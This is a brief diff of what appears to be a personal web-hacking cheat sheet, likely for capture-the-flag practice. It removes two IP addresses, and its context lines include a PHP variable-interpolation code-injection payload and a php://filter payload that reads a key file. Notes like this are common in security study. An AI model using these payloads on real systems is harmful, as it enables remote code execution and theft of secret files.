@@ -83,8 +83,6 @@ http://www.njstu.net/69394.html
 https://www.draw.io/
 ssh -T user@localhost /bin/bash -i
 
-205.171.3.65
-205.171.2.65
 
 php双引号${${phpinfo();}} php://filter/read=convert.base64-encode/resource=../key.php
 python -m SimpleHTTPServer 233
